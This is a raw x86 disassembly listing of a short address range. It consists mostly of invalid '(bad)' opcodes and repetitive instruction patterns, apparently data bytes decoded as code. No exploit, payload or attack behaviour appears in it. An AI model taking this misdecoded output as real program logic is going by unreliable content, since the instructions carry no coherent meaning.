  44b0e4:	(bad)  
  44b0e5:	(bad)  
  44b0e7:	add    esp,DWORD PTR [edx-0x27]
  44b0ea:	out    0x3,eax
  44b0ec:	(bad)  
  44b0ed:	(bad)  
  44b0ef:	add    esp,DWORD PTR [edx-0x27]
  44b0f2:	out    0x3,eax
  44b0f4:	(bad)  
  44b0f5:	(bad)  
  44b0f7:	add    esp,DWORD PTR [edx-0x27]
  44b0fa:	out    0x3,eax
  44b0fc:	(bad)  
  44b0fd:	(bad)  
  44b0ff:	add    esp,DWORD PTR [edx-0x27]
  44b102:	out    0x3,eax
  44b104:	(bad)  
  44b105:	(bad)  
  44b107:	add    esp,DWORD PTR [edx-0x27]
  44b10a:	out    0x3,eax
  44b10c:	(bad)  
  44b10d:	(bad)  
  44b10f:	add    esp,DWORD PTR [edx-0x27]
  44b112:	out    0x3,eax
  44b114:	(bad)  
  44b115:	(bad)  
  44b117:	add    esp,DWORD PTR [edx-0x27]
  44b11a:	out    0x3,eax
  44b11c:	(bad)  
  44b11d:	(bad)  
  44b11f:	add    esp,DWORD PTR [edx-0x27]
  44b122:	out    0x3,eax
  44b124:	(bad)  
  44b125:	(bad)  
  44b127:	add    esp,DWORD PTR [edx-0x27]
  44b12a:	out    0x3,eax
  44b12c:	add    BYTE PTR [edx-0x27],ah
  44b12f:	out    0x3,eax
  44b131:	(bad)  
  44b132:	(bad)  
  44b134:	add    esp,DWORD PTR [edx-0x27]
  44b137:	out    0x3,eax
  44b139:	(bad)  
  44b13a:	(bad)  
  44b13c:	add    esp,DWORD PTR [edx-0x27]
  44b13f:	out    0x3,eax
  44b141:	(bad)  
  44b142:	(bad)  
  44b144:	add    esp,DWORD PTR [edx-0x27]
  44b147:	out    0x3,eax
  44b149:	(bad)  
  44b14a:	(bad)  
  44b14c:	add    esp,DWORD PTR [edx-0x27]
  44b14f:	out    0x3,eax
  44b151:	(bad)  
  44b152:	(bad)  
  44b154:	add    esp,DWORD PTR [edx-0x27]
  44b157:	add    cl,ch
  44b159:	popa   
  44b15a:	fld    DWORD PTR [eax]
  44b15c:	jmp    0xe9458ac2
  44b161:	popa   
  44b162:	fld    DWORD PTR [eax]
  44b164:	jmp    0xe9458aca
  44b169:	popa   
  44b16a:	fld    DWORD PTR [eax]
  44b16c:	jmp    0xe9458ad2
  44b171:	popa   
  44b172:	fld    DWORD PTR [eax]
  44b174:	jmp    0xe9458ada
  44b179:	popa   
  44b17a:	fld    DWORD PTR [eax]
  44b17c:	jmp    0xe9458ae2
  44b181:	popa   
  44b182:	fld    DWORD PTR [eax]
  44b184:	jmp    0xe9458aea
  44b189:	popa   
  44b18a:	fld    DWORD PTR [eax]
  44b18c:	jmp    0xe9458af2
  44b191:	add    BYTE PTR [ecx-0x27],ah
  44b194:	add    cl,ch
  44b196:	popa   
  44b197:	fld    DWORD PTR [eax]
  44b199:	jmp    0xe9458aff
  44b19e:	popa   
  44b19f:	fld    DWORD PTR [eax]
  44b1a1:	jmp    0xe9458b07
  44b1a6:	popa   
  44b1a7:	fld    DWORD PTR [eax]
  44b1a9:	jmp    0xe9458b0f
  44b1ae:	popa   
  44b1af:	fld    DWORD PTR [eax]
  44b1b1:	jmp    0xe9458b17
  44b1b6:	popa   
  44b1b7:	fld    DWORD PTR [eax]
  44b1b9:	jmp    0xe9458b1f
  44b1be:	popa   
  44b1bf:	fld    DWORD PTR [eax]
  44b1c1:	jmp    0xe9458b27
  44b1c6:	popa   
  44b1c7:	fld    DWORD PTR [eax]
  44b1c9:	jmp    0xe9458b2f
  44b1ce:	popa   
  44b1cf:	fld    DWORD PTR [eax]
  44b1d1:	add    bl,cl
  44b1d3:	fild   DWORD PTR [eax]
  44b1d5:	add    bl,cl
  44b1d7:	fild   DWORD PTR [eax]
  44b1d9:	add    BYTE PTR [ebx-0x44ffff25],bh
  44b1df:	fild   DWORD PTR [eax]
  44b1e1:	add    BYTE PTR [ebx-0x74ffff25],cl
  44b1e7:	fild   DWORD PTR [eax]
  44b1e9:	add    BYTE PTR [ebx-0x25],bh
  44b1ec:	add    BYTE PTR [eax],al
  44b1ee:	jnp    0x44b1cb
  44b1f0:	add    BYTE PTR [eax],al
  44b1f2:	mov    ebx,ebx
  44b1f4:	add    BYTE PTR [eax],al
  44b1f6:	add    BYTE PTR [ebx+0x7b0000db],cl
  44b1fc:	fild   DWORD PTR [eax]
  44b1fe:	add    BYTE PTR [ebx-0x25],bh
  44b201:	add    BYTE PTR [eax],al
  44b203:	dec    ebx
  44b204:	fild   DWORD PTR [eax]
  44b206:	add    BYTE PTR [ebx-0x25],cl
  44b209:	add    BYTE PTR [eax],al
  44b20b:	cmp    ebx,ebx
  44b20d:	add    BYTE PTR [eax],al
  44b20f:	cmp    ebx,ebx
  44b211:	add    BYTE PTR [eax],al
  44b213:	dec    ebx
  44b214:	fild   DWORD PTR [eax]
  44b216:	add    BYTE PTR [ebx-0x25],cl
  44b219:	add    BYTE PTR [eax],al
  44b21b:	cmp    ebx,ebx
  44b21d:	add    BYTE PTR [eax],al
  44b21f:	cmp    ebx,ebx
  44b221:	add    BYTE PTR [eax],al
  44b223:	or     ebx,ebx
  44b225:	add    BYTE PTR [eax],al
  44b227:	or     ebx,ebx
  44b229:	add    BYTE PTR [eax],al
  44b22b:	sti    
  44b22c:	fiadd  DWORD PTR [eax]
  44b22e:	add    bl,bh
  44b230:	fiadd  DWORD PTR [eax]
  44b232:	add    BYTE PTR [ebx],cl
  44b234:	fild   DWORD PTR [eax]
  44b236:	add    BYTE PTR [ebx],cl
  44b238:	fild   DWORD PTR [eax]
  44b23a:	add    bl,bh
  44b23c:	fiadd  DWORD PTR [eax]
  44b23e:	add    bl,bh
  44b240:	fiadd  DWORD PTR [eax]
  44b242:	add    bl,cl
  44b244:	fiadd  DWORD PTR [eax]
  44b246:	add    bl,cl
  44b248:	fiadd  DWORD PTR [eax]
  44b24a:	add    BYTE PTR [edx-0x10],ah
  44b24d:	add    DWORD PTR [eax],eax
  44b24f:	(bad)  
  44b250:	lock add DWORD PTR [eax],eax
  44b253:	(bad)  
  44b254:	lock add DWORD PTR [eax],eax
  44b257:	(bad)  
  44b258:	lock add DWORD PTR [eax],eax
  44b25b:	add    BYTE PTR [edx-0x10],ah
  44b25e:	add    DWORD PTR [eax],eax
  44b260:	(bad)  
  44b261:	lock add DWORD PTR [eax],eax
  44b264:	(bad)  
  44b265:	lock add DWORD PTR [eax],eax
  44b268:	(bad)  
  44b269:	lock add DWORD PTR [eax],eax
  44b26c:	(bad)  
  44b26d:	lock add DWORD PTR [eax],eax
  44b270:	(bad)  
  44b271:	lock add DWORD PTR [eax],eax
  44b274:	(bad)  
  44b275:	lock add DWORD PTR [eax],eax
  44b278:	(bad)  
  44b279:	lock add DWORD PTR [eax],eax
  44b27c:	(bad)  
  44b27d:	lock add DWORD PTR [eax],eax
  44b280:	(bad)  
  44b281:	lock add DWORD PTR [eax],eax
  44b284:	(bad)  
  44b285:	lock add DWORD PTR [eax],eax
  44b288:	(bad)  
  44b289:	lock add DWORD PTR [eax],eax
  44b28c:	(bad)  
  44b28d:	lock add DWORD PTR [eax],eax
  44b290:	(bad)  
  44b291:	lock add DWORD PTR [eax],eax
  44b294:	(bad)  
  44b295:	lock add DWORD PTR [eax],eax
  44b298:	(bad)  
  44b299:	lock add DWORD PTR [eax],eax
  44b29c:	(bad)  
  44b29d:	lock add DWORD PTR [eax],eax
  44b2a0:	(bad)  
  44b2a1:	lock add DWORD PTR [eax],eax
  44b2a4:	(bad)  
  44b2a5:	lock add DWORD PTR [eax],eax
  44b2a8:	(bad)  
  44b2a9:	lock add DWORD PTR [eax],eax
  44b2ac:	(bad)  
  44b2ad:	lock add DWORD PTR [eax],eax
  44b2b0:	(bad)  
  44b2b1:	lock add DWORD PTR [eax],eax
  44b2b4:	(bad)  
  44b2b5:	lock add DWORD PTR [eax],eax
  44b2b8:	(bad)  
  44b2b9:	lock add DWORD PTR [eax],eax
  44b2bc:	(bad)  
  44b2bd:	lock add DWORD PTR [eax],eax
  44b2c0:	add    BYTE PTR [edx-0x10],ah
  44b2c3:	add    DWORD PTR [eax],eax
  44b2c5:	(bad)  
  44b2c6:	(bad)  
  44b2c8:	add    esp,DWORD PTR [edx-0x27]
  44b2cb:	out    0x3,eax
  44b2cd:	(bad)  
  44b2ce:	(bad)  
  44b2d0:	add    esp,DWORD PTR [edx-0x27]
  44b2d3:	out    0x3,eax
  44b2d5:	(bad)  
  44b2d6:	(bad)  
  44b2d8:	add    esp,DWORD PTR [edx-0x27]
  44b2db:	out    0x3,eax
  44b2dd:	(bad)  
  44b2de:	(bad)  
  44b2e0:	add    esp,DWORD PTR [edx-0x27]
  44b2e3:	out    0x3,eax
  44b2e5:	(bad)  
  44b2e6:	(bad)  
  44b2e8:	add    esp,DWORD PTR [edx-0x27]
  44b2eb:	out    0x3,eax
  44b2ed:	(bad)  
  44b2ee:	(bad)  
  44b2f0:	add    esp,DWORD PTR [edx-0x27]
  44b2f3:	out    0x3,eax
  44b2f5:	(bad)  
  44b2f6:	(bad)  
  44b2f8:	add    esp,DWORD PTR [edx-0x27]
  44b2fb:	out    0x3,eax
  44b2fd:	(bad)  
  44b2fe:	(bad)  
  44b300:	add    esp,DWORD PTR [edx-0x27]
  44b303:	out    0x3,eax
  44b305:	(bad)  
  44b306:	(bad)  
  44b308:	add    esp,DWORD PTR [edx-0x27]
  44b30b:	out    0x3,eax
  44b30d:	(bad)  
  44b30e:	(bad)  
  44b310:	add    esp,DWORD PTR [edx-0x27]
  44b313:	out    0x3,eax
  44b315:	(bad)  
  44b316:	(bad)  
  44b318:	add    esp,DWORD PTR [edx-0x27]
  44b31b:	out    0x3,eax
  44b31d:	(bad)  
  44b31e:	(bad)  
  44b320:	add    esp,DWORD PTR [edx-0x27]
  44b323:	out    0x3,eax
  44b325:	add    BYTE PTR [edx-0x27],ah
  44b328:	out    0x3,eax
  44b32a:	(bad)  
  44b32b:	(bad)  
  44b32d:	add    esp,DWORD PTR [edx-0x27]
  44b330:	out    0x3,eax
  44b332:	(bad)  
  44b333:	(bad)  
  44b335:	add    esp,DWORD PTR [edx-0x27]
  44b338:	out    0x3,eax
  44b33a:	(bad)  
  44b33b:	(bad)  
  44b33d:	add    esp,DWORD PTR [edx-0x27]
  44b340:	add    cl,ch
  44b342:	popa   
  44b343:	fld    DWORD PTR [eax]
  44b345:	jmp    0xe9458cab
  44b34a:	popa   
  44b34b:	fld    DWORD PTR [eax]
  44b34d:	jmp    0xe9458cb3
  44b352:	popa   
  44b353:	fld    DWORD PTR [eax]
  44b355:	jmp    0xe9458cbb
  44b35a:	popa   
  44b35b:	fld    DWORD PTR [eax]
  44b35d:	jmp    0xe9458cc3
  44b362:	popa   
  44b363:	fld    DWORD PTR [eax]
  44b365:	jmp    0xe9458ccb
  44b36a:	popa   
  44b36b:	fld    DWORD PTR [eax]
  44b36d:	jmp    0xe9458cd3
  44b372:	popa   
  44b373:	fld    DWORD PTR [eax]
  44b375:	jmp    0xe9458cdb
  44b37a:	popa   
  44b37b:	fld    DWORD PTR [eax]
  44b37d:	jmp    0xe9458ce3
  44b382:	popa   
  44b383:	fld    DWORD PTR [eax]
  44b385:	jmp    0xe9458ceb
  44b38a:	add    BYTE PTR [ecx-0x27],ah
  44b38d:	add    cl,ch
  44b38f:	popa   
  44b390:	fld    DWORD PTR [eax]
  44b392:	jmp    0xe9458cf8
  44b397:	popa   
  44b398:	fld    DWORD PTR [eax]
  44b39a:	jmp    0xe9458d00
  44b39f:	popa   
  44b3a0:	fld    DWORD PTR [eax]
  44b3a2:	jmp    0xe9458d08
  44b3a7:	popa   
  44b3a8:	fld    DWORD PTR [eax]
  44b3aa:	jmp    0xe9458d10
  44b3af:	popa   
  44b3b0:	fld    DWORD PTR [eax]
  44b3b2:	jmp    0xe9458d18
  44b3b7:	popa   
  44b3b8:	fld    DWORD PTR [eax]
  44b3ba:	add    BYTE PTR [ebx],cl
  44b3bc:	fadd   DWORD PTR [eax]
  44b3be:	add    bl,bh
  44b3c0:	xlat   BYTE PTR ds:[ebx]
  44b3c1:	add    BYTE PTR [eax],al
  44b3c3:	sti    
  44b3c4:	xlat   BYTE PTR ds:[ebx]
  44b3c5:	add    BYTE PTR [eax],al
  44b3c7:	retf   
  44b3c8:	xlat   BYTE PTR ds:[ebx]
  44b3c9:	add    BYTE PTR [eax],al
  44b3cb:	retf   
  44b3cc:	xlat   BYTE PTR ds:[ebx]
  44b3cd:	add    BYTE PTR [eax],al
  44b3cf:	mov    ebx,0xbb0000d7
  44b3d4:	xlat   BYTE PTR ds:[ebx]
  44b3d5:	add    BYTE PTR [eax],al
  44b3d7:	retf   
  44b3d8:	xlat   BYTE PTR ds:[ebx]
  44b3d9:	add    BYTE PTR [eax],al
  44b3db:	retf   
  44b3dc:	xlat   BYTE PTR ds:[ebx]
  44b3dd:	add    BYTE PTR [eax],al
  44b3df:	mov    ebx,0xbb0000d7
  44b3e4:	xlat   BYTE PTR ds:[ebx]
  44b3e5:	add    BYTE PTR [eax],al
  44b3e7:	mov    edx,edi
  44b3e9:	add    BYTE PTR [eax],al
  44b3eb:	mov    edx,edi
  44b3ed:	add    BYTE PTR [eax],al
  44b3ef:	add    BYTE PTR [ebx-0x29],bh
  44b3f2:	add    BYTE PTR [eax],al
  44b3f4:	jnp    0x44b3cd
  44b3f6:	add    BYTE PTR [eax],al
  44b3f8:	mov    edx,edi
  44b3fa:	add    BYTE PTR [eax],al
  44b3fc:	mov    edx,edi
  44b3fe:	add    BYTE PTR [eax],al
  44b400:	jnp    0x44b3d9
  44b402:	add    BYTE PTR [eax],al
  44b404:	jnp    0x44b3dd
  44b406:	add    BYTE PTR [eax],al
  44b408:	dec    ebx
  44b409:	xlat   BYTE PTR ds:[ebx]
  44b40a:	add    BYTE PTR [eax],al
  44b40c:	dec    ebx
  44b40d:	xlat   BYTE PTR ds:[ebx]
  44b40e:	add    BYTE PTR [eax],al
  44b410:	cmp    edx,edi
  44b412:	add    BYTE PTR [eax],al
  44b414:	cmp    edx,edi
  44b416:	add    BYTE PTR [eax],al
  44b418:	dec    ebx
  44b419:	xlat   BYTE PTR ds:[ebx]
  44b41a:	add    BYTE PTR [eax],al
  44b41c:	dec    ebx
  44b41d:	xlat   BYTE PTR ds:[ebx]
  44b41e:	add    BYTE PTR [eax],al
  44b420:	cmp    edx,edi
  44b422:	add    BYTE PTR [eax],al
  44b424:	cmp    edx,edi
  44b426:	add    BYTE PTR [eax],al
  44b428:	or     edx,edi
  44b42a:	add    BYTE PTR [eax],al
  44b42c:	or     edx,edi
  44b42e:	add    BYTE PTR [eax],al
  44b430:	sti    
  44b431:	(bad)  
  44b432:	add    BYTE PTR [eax],al
  44b434:	(bad)  
  44b435:	lock add DWORD PTR [eax],eax
  44b438:	(bad)  
  44b439:	lock add DWORD PTR [eax],eax
  44b43c:	(bad)  
  44b43d:	lock add DWORD PTR [eax],eax
  44b440:	(bad)  
  44b441:	lock add DWORD PTR [eax],eax
  44b444:	(bad)  
  44b445:	lock add DWORD PTR [eax],eax
  44b448:	(bad)  
  44b449:	lock add DWORD PTR [eax],eax
  44b44c:	(bad)  
  44b44d:	lock add DWORD PTR [eax],eax
  44b450:	(bad)  
  44b451:	lock add DWORD PTR [eax],eax
  44b454:	add    BYTE PTR [edx-0x10],ah
  44b457:	add    DWORD PTR [eax],eax
  44b459:	(bad)  
  44b45a:	lock add DWORD PTR [eax],eax
  44b45d:	(bad)  
  44b45e:	lock add DWORD PTR [eax],eax
  44b461:	(bad)  
  44b462:	lock add DWORD PTR [eax],eax
  44b465:	(bad)  
  44b466:	lock add DWORD PTR [eax],eax
  44b469:	(bad)  
  44b46a:	lock add DWORD PTR [eax],eax
  44b46d:	(bad)  
  44b46e:	lock add DWORD PTR [eax],eax
  44b471:	(bad)  
  44b472:	lock add DWORD PTR [eax],eax
  44b475:	(bad)  
  44b476:	lock add DWORD PTR [eax],eax
  44b479:	(bad)  
  44b47a:	lock add DWORD PTR [eax],eax
  44b47d:	(bad)  
  44b47e:	lock add DWORD PTR [eax],eax
  44b481:	(bad)  
  44b482:	lock add DWORD PTR [eax],eax
  44b485:	(bad)  
  44b486:	lock add DWORD PTR [eax],eax
  44b489:	(bad)  
  44b48a:	lock add DWORD PTR [eax],eax
  44b48d:	(bad)  
  44b48e:	lock add DWORD PTR [eax],eax
  44b491:	(bad)  
  44b492:	lock add DWORD PTR [eax],eax
  44b495:	(bad)  
  44b496:	lock add DWORD PTR [eax],eax
  44b499:	(bad)  
  44b49a:	lock add DWORD PTR [eax],eax
  44b49d:	(bad)  
  44b49e:	lock add DWORD PTR [eax],eax
  44b4a1:	(bad)  
  44b4a2:	lock add DWORD PTR [eax],eax
  44b4a5:	(bad)  
  44b4a6:	lock add DWORD PTR [eax],eax
  44b4a9:	(bad)  
  44b4aa:	lock add DWORD PTR [eax],eax
  44b4ad:	(bad)  
  44b4ae:	(bad)  
  44b4b0:	add    esp,DWORD PTR [edx-0x27]
  44b4b3:	out    0x3,eax
  44b4b5:	(bad)  
  44b4b6:	(bad)  
  44b4b8:	add    eax,DWORD PTR [eax]
  44b4ba:	(bad)  
  44b4bb:	(bad)  
  44b4bd:	add    esp,DWORD PTR [edx-0x27]
  44b4c0:	out    0x3,eax
  44b4c2:	(bad)  
  44b4c3:	(bad)  
  44b4c5:	add    esp,DWORD PTR [edx-0x27]
  44b4c8:	out    0x3,eax
  44b4ca:	(bad)  
  44b4cb:	(bad)  
  44b4cd:	add    esp,DWORD PTR [edx-0x27]
  44b4d0:	out    0x3,eax
  44b4d2:	(bad)  
  44b4d3:	(bad)  
  44b4d5:	add    esp,DWORD PTR [edx-0x27]
  44b4d8:	out    0x3,eax
  44b4da:	(bad)  
  44b4db:	(bad)  
  44b4dd:	add    esp,DWORD PTR [edx-0x27]
  44b4e0:	out    0x3,eax
  44b4e2:	(bad)  
  44b4e3:	(bad)  
  44b4e5:	add    esp,DWORD PTR [edx-0x27]
  44b4e8:	out    0x3,eax
  44b4ea:	(bad)  
  44b4eb:	(bad)  
  44b4ed:	add    esp,DWORD PTR [edx-0x27]
  44b4f0:	out    0x3,eax
  44b4f2:	(bad)  
  44b4f3:	(bad)  
  44b4f5:	add    esp,DWORD PTR [edx-0x27]
  44b4f8:	out    0x3,eax
  44b4fa:	(bad)  
  44b4fb:	(bad)  
  44b4fd:	add    esp,DWORD PTR [edx-0x27]
  44b500:	out    0x3,eax
  44b502:	(bad)  
  44b503:	(bad)  
  44b505:	add    esp,DWORD PTR [edx-0x27]
  44b508:	out    0x3,eax
  44b50a:	(bad)  
  44b50b:	(bad)  
  44b50d:	add    esp,DWORD PTR [edx-0x27]
  44b510:	out    0x3,eax
  44b512:	(bad)  
  44b513:	(bad)  
  44b515:	add    esp,DWORD PTR [edx-0x27]
  44b518:	out    0x3,eax
  44b51a:	(bad)  
  44b51b:	(bad)  
  44b51d:	add    eax,DWORD PTR [eax]
  44b51f:	(bad)  
  44b520:	(bad)  
  44b522:	add    esp,DWORD PTR [edx-0x27]
  44b525:	out    0x3,eax
  44b527:	(bad)  
  44b528:	fld    DWORD PTR [eax]
  44b52a:	jmp    0xe9458e90
  44b52f:	popa   
  44b530:	fld    DWORD PTR [eax]
  44b532:	jmp    0xe9458e98
  44b537:	popa   
  44b538:	fld    DWORD PTR [eax]
  44b53a:	jmp    0xe9458ea0
  44b53f:	popa   
  44b540:	fld    DWORD PTR [eax]
  44b542:	jmp    0xe9458ea8
  44b547:	popa   
  44b548:	fld    DWORD PTR [eax]
  44b54a:	jmp    0xe9458eb0
  44b54f:	popa   
  44b550:	fld    DWORD PTR [eax]
  44b552:	jmp    0xe9458eb8
  44b557:	popa   
  44b558:	fld    DWORD PTR [eax]
  44b55a:	jmp    0xe9458ec0
  44b55f:	popa   
  44b560:	fld    DWORD PTR [eax]
  44b562:	jmp    0xe9458ec8
  44b567:	popa   
  44b568:	fld    DWORD PTR [eax]
  44b56a:	jmp    0xe9458ed0
  44b56f:	popa   
  44b570:	fld    DWORD PTR [eax]
  44b572:	jmp    0xe9458ed8
  44b577:	popa   
  44b578:	fld    DWORD PTR [eax]
  44b57a:	jmp    0xe9458ee0
  44b57f:	popa   
  44b580:	fld    DWORD PTR [eax]
  44b582:	jmp    0x11e1687
  44b587:	jmp    0xe9458eed
  44b58c:	popa   
  44b58d:	fld    DWORD PTR [eax]
  44b58f:	jmp    0xe9458ef5
  44b594:	popa   
  44b595:	fld    DWORD PTR [eax]
  44b597:	jmp    0xe9458efd
  44b59c:	popa   
  44b59d:	fld    DWORD PTR [eax]
  44b59f:	jmp    0x458f05
  44b5a4:	cmp    ebx,esp
  44b5a6:	add    BYTE PTR [eax],al
  44b5a8:	cmp    ebx,esp
  44b5aa:	add    BYTE PTR [eax],al
  44b5ac:	or     ebx,esp
  44b5ae:	add    BYTE PTR [eax],al
  44b5b0:	or     ebx,esp
  44b5b2:	add    BYTE PTR [eax],al
  44b5b4:	sti    
  44b5b5:	fild   DWORD PTR [eax]
  44b5b7:	add    bl,bh
  44b5b9:	fild   DWORD PTR [eax]
  44b5bb:	add    BYTE PTR [ebx],cl
  44b5bd:	fadd   QWORD PTR [eax]
  44b5bf:	add    BYTE PTR [ebx],cl
  44b5c1:	fadd   QWORD PTR [eax]
  44b5c3:	add    bl,bh
  44b5c5:	fild   DWORD PTR [eax]
  44b5c7:	add    bl,bh
  44b5c9:	fild   DWORD PTR [eax]
  44b5cb:	add    bl,cl
  44b5cd:	fild   DWORD PTR [eax]
  44b5cf:	add    bl,cl
  44b5d1:	fild   DWORD PTR [eax]
  44b5d3:	add    BYTE PTR [ebx-0x44ffff25],bh
  44b5d9:	fild   DWORD PTR [eax]
  44b5db:	add    bl,cl
  44b5dd:	fild   DWORD PTR [eax]
  44b5df:	add    bl,cl
  44b5e1:	fild   DWORD PTR [eax]
  44b5e3:	add    BYTE PTR [ebx+0xdb],bh
  44b5e9:	mov    ebx,0x8b0000db
  44b5ee:	fild   DWORD PTR [eax]
  44b5f0:	add    BYTE PTR [ebx+0x7b0000db],cl
  44b5f6:	fild   DWORD PTR [eax]
  44b5f8:	add    BYTE PTR [ebx-0x25],bh
  44b5fb:	add    BYTE PTR [eax],al
  44b5fd:	mov    ebx,ebx
  44b5ff:	add    BYTE PTR [eax],al
  44b601:	mov    ebx,ebx
  44b603:	add    BYTE PTR [eax],al
  44b605:	jnp    0x44b5e2
  44b607:	add    BYTE PTR [eax],al
  44b609:	jnp    0x44b5e6
  44b60b:	add    BYTE PTR [eax],al
  44b60d:	dec    ebx
  44b60e:	fild   DWORD PTR [eax]
  44b610:	add    BYTE PTR [ebx-0x25],cl
  44b613:	add    BYTE PTR [eax],al
  44b615:	cmp    ebx,ebx
  44b617:	add    BYTE PTR [eax],al
  44b619:	cmp    ebx,ebx
  44b61b:	add    BYTE PTR [eax],al
  44b61d:	(bad)  
  44b61e:	lock add DWORD PTR [eax],eax
  44b621:	(bad)  
  44b622:	lock add DWORD PTR [eax],eax
  44b625:	(bad)  
  44b626:	lock add DWORD PTR [eax],eax
  44b629:	(bad)  
  44b62a:	lock add DWORD PTR [eax],eax
  44b62d:	(bad)  
  44b62e:	lock add DWORD PTR [eax],eax
  44b631:	(bad)  
  44b632:	lock add DWORD PTR [eax],eax
  44b635:	(bad)  
  44b636:	lock add DWORD PTR [eax],eax
  44b639:	(bad)  
  44b63a:	lock add DWORD PTR [eax],eax
  44b63d:	(bad)  
  44b63e:	lock add DWORD PTR [eax],eax
  44b641:	(bad)  
  44b642:	lock add DWORD PTR [eax],eax
  44b645:	(bad)  
  44b646:	lock add DWORD PTR [eax],eax
  44b649:	(bad)  
  44b64a:	lock add DWORD PTR [eax],eax
  44b64d:	add    BYTE PTR [edx-0x10],ah
  44b650:	add    DWORD PTR [eax],eax
  44b652:	(bad)  
  44b653:	lock add DWORD PTR [eax],eax
  44b656:	(bad)  
  44b657:	lock add DWORD PTR [eax],eax
  44b65a:	(bad)  
  44b65b:	lock add DWORD PTR [eax],eax
  44b65e:	(bad)  
  44b65f:	lock add DWORD PTR [eax],eax
  44b662:	(bad)  
  44b663:	lock add DWORD PTR [eax],eax
  44b666:	(bad)  
  44b667:	lock add DWORD PTR [eax],eax
  44b66a:	(bad)  
  44b66b:	lock add DWORD PTR [eax],eax
  44b66e:	(bad)  
  44b66f:	lock add DWORD PTR [eax],eax
  44b672:	(bad)  
  44b673:	lock add DWORD PTR [eax],eax
  44b676:	(bad)  
  44b677:	lock add DWORD PTR [eax],eax
  44b67a:	(bad)  
  44b67b:	lock add DWORD PTR [eax],eax
  44b67e:	(bad)  
  44b67f:	lock add DWORD PTR [eax],eax
  44b682:	(bad)  
  44b683:	lock add DWORD PTR [eax],eax
  44b686:	(bad)  
  44b687:	lock add DWORD PTR [eax],eax
  44b68a:	(bad)  
  44b68b:	lock add DWORD PTR [eax],eax
  44b68e:	(bad)  
  44b68f:	lock add DWORD PTR [eax],eax
  44b692:	(bad)  
  44b693:	lock add DWORD PTR [eax],eax
  44b696:	(bad)  
  44b697:	(bad)  
  44b699:	add    esp,DWORD PTR [edx-0x27]
  44b69c:	out    0x3,eax
  44b69e:	(bad)  
  44b69f:	(bad)  
  44b6a1:	add    esp,DWORD PTR [edx-0x27]
  44b6a4:	out    0x3,eax
  44b6a6:	(bad)  
  44b6a7:	(bad)  
  44b6a9:	add    esp,DWORD PTR [edx-0x27]
  44b6ac:	out    0x3,eax
  44b6ae:	(bad)  
  44b6af:	(bad)  
  44b6b1:	add    eax,DWORD PTR [eax]
  44b6b3:	(bad)  
  44b6b4:	(bad)  
  44b6b6:	add    esp,DWORD PTR [edx-0x27]
  44b6b9:	out    0x3,eax
  44b6bb:	(bad)  
  44b6bc:	(bad)  
  44b6be:	add    esp,DWORD PTR [edx-0x27]
  44b6c1:	out    0x3,eax
  44b6c3:	(bad)  
  44b6c4:	(bad)  
  44b6c6:	add    esp,DWORD PTR [edx-0x27]
  44b6c9:	out    0x3,eax
  44b6cb:	(bad)  
  44b6cc:	(bad)  
  44b6ce:	add    esp,DWORD PTR [edx-0x27]
  44b6d1:	out    0x3,eax
  44b6d3:	(bad)  
  44b6d4:	(bad)  
  44b6d6:	add    esp,DWORD PTR [edx-0x27]
  44b6d9:	out    0x3,eax
  44b6db:	(bad)  
  44b6dc:	(bad)  
  44b6de:	add    esp,DWORD PTR [edx-0x27]
  44b6e1:	out    0x3,eax
  44b6e3:	(bad)  
  44b6e4:	(bad)  
  44b6e6:	add    esp,DWORD PTR [edx-0x27]
  44b6e9:	out    0x3,eax
  44b6eb:	(bad)  
  44b6ec:	(bad)  
  44b6ee:	add    esp,DWORD PTR [edx-0x27]
  44b6f1:	out    0x3,eax
  44b6f3:	(bad)  
  44b6f4:	(bad)  
  44b6f6:	add    esp,DWORD PTR [edx-0x27]
  44b6f9:	out    0x3,eax
  44b6fb:	(bad)  
  44b6fc:	(bad)  
  44b6fe:	add    esp,DWORD PTR [edx-0x27]
  44b701:	out    0x3,eax
  44b703:	(bad)  
  44b704:	(bad)  
  44b706:	add    esp,DWORD PTR [edx-0x27]
  44b709:	out    0x3,eax
  44b70b:	(bad)  
  44b70c:	(bad)  
  44b70e:	add    esp,DWORD PTR [edx-0x27]
  44b711:	add    cl,ch
  44b713:	popa   
  44b714:	fld    DWORD PTR [eax]
  44b716:	jmp    0x11e181b
  44b71b:	jmp    0xe9459081
  44b720:	popa   
  44b721:	fld    DWORD PTR [eax]
  44b723:	jmp    0xe9459089
  44b728:	popa   
  44b729:	fld    DWORD PTR [eax]
  44b72b:	jmp    0xe9459091
  44b730:	popa   
  44b731:	fld    DWORD PTR [eax]
  44b733:	jmp    0xe9459099
  44b738:	popa   
  44b739:	fld    DWORD PTR [eax]
  44b73b:	jmp    0xe94590a1
  44b740:	popa   
  44b741:	fld    DWORD PTR [eax]
  44b743:	jmp    0xe94590a9
  44b748:	popa   
  44b749:	fld    DWORD PTR [eax]
  44b74b:	jmp    0xe94590b1
  44b750:	popa   
  44b751:	fld    DWORD PTR [eax]
  44b753:	jmp    0xe94590b9
  44b758:	popa   
  44b759:	fld    DWORD PTR [eax]
  44b75b:	jmp    0xe94590c1
  44b760:	popa   
  44b761:	fld    DWORD PTR [eax]
  44b763:	jmp    0xe94590c9
  44b768:	popa   
  44b769:	fld    DWORD PTR [eax]
  44b76b:	jmp    0xe94590d1
  44b770:	popa   
  44b771:	fld    DWORD PTR [eax]
  44b773:	jmp    0xe94590d9
  44b778:	popa   
  44b779:	fld    DWORD PTR [eax]
  44b77b:	jmp    0x11e1880
  44b780:	jmp    0xe94590e6
  44b785:	popa   
  44b786:	fld    DWORD PTR [eax]
  44b788:	jmp    0x4590ee
  44b78d:	jnp    0x44b767
  44b78f:	add    BYTE PTR [eax],al
  44b791:	dec    ebx
  44b792:	fadd   DWORD PTR [eax]
  44b794:	add    BYTE PTR [ebx-0x28],cl
  44b797:	add    BYTE PTR [eax],al
  44b799:	cmp    ebx,eax
  44b79b:	add    BYTE PTR [eax],al
  44b79d:	cmp    ebx,eax
  44b79f:	add    BYTE PTR [eax],al
  44b7a1:	dec    ebx
  44b7a2:	fadd   DWORD PTR [eax]
  44b7a4:	add    BYTE PTR [ebx-0x28],cl
  44b7a7:	add    BYTE PTR [eax],al
  44b7a9:	cmp    ebx,eax
  44b7ab:	add    BYTE PTR [eax],al
  44b7ad:	cmp    ebx,eax
  44b7af:	add    BYTE PTR [eax],al
  44b7b1:	or     ebx,eax
  44b7b3:	add    BYTE PTR [eax],al
  44b7b5:	or     ebx,eax
  44b7b7:	add    BYTE PTR [eax],al
  44b7b9:	sti    
  44b7ba:	xlat   BYTE PTR ds:[ebx]
